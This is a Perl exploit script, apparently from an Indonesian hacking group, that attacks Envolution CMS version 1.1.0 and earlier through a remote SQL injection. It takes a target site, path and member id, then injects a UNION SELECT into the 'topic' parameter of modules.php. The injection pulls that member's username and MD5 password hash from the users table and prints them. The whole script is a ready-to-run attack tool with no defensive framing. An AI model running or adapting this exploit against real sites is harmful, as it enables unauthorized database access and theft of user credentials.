#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Cookies;

if(@ARGV < 3)
{
    usage();

    exit();
}

$site = $ARGV[0]; # Site Target
$path = $ARGV[1]; # Path direktori envolution_1-0-1
$usid = $ARGV[2]; # member id

$www = new LWP::UserAgent;
$sql = 
"$site/$path/modules.php?op=modload&name=News&file=index&catid=&topic=2%20and%201=2%20union%20all%20select%201,2,3,concat(pn_uname,0x3a,pn_pass)%20from%20envo_users%20where%20pn_uid=$usid/*";
print "\n\n [~] Mencari Username:Password(md5) member id = $usid \n";
$res = $www -> get($sql) or err();
$res -> content() =~ /<b>(.*)<\/b>/ or err();
print "\n [+] Username:Password(md5) member id = $usid  \n";
print "\n [>] $1 \n\n";

sub usage()
{
print "#############################################################\n";
print "#                      newhack[dot]org                      #\n";
print "#############################################################\n";
print "#        Envolution <= v1.1.0 Remote SQL Injection          #\n";
print "#       http://sourceforge.net/projects/envolution          #\n";
print "#          k1tk4t - newhack[dot]org - Indonesia             #\n";
print "#     cara penggunaan: enov.pl [site] [path] [member id]    #\n";
print "#       contoh: enov.pl http://localhost /html  2           #\n";
print "#-----------------------------------------------------------#\n";
print "# Thanks to; str0ke, xoron, y3dips,                         #\n";
print "# newhack[dot]org staff dan member                          #\n";
print "# mR.opt1lc,fusion,PusHm0v,Ghoz,fl3xu5,bius,iind_id,slackX  #\n";
print "# Semua Komunitas Hacker dan Sekuriti Indonesia;            #\n";
print "#############################################################\n";
}

sub err()
{
print "\n [-] Exploit gagal :( - cari yang lain!";
exit();
}
